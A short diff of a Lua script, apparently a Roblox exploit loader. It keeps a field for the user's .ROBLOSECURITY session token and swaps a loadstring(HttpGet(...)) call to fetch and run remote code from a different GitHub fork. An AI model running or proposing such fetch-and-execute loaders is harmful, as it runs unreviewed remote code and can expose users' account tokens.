@@ -24,7 +24,7 @@ _G.Cookie = "" -- optional: your own .ROBLOSECURITY token for Roblox API request
 
 pcall(function()
     loadstring(game:HttpGet(
-        "https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua",
+        "https://raw.githubusercontent.com/matheusrodrigues-s/chubxide-fork/refs/heads/main/ROGUE/rogue_ui.lualoader.lua",
         true
     ))()
 end)
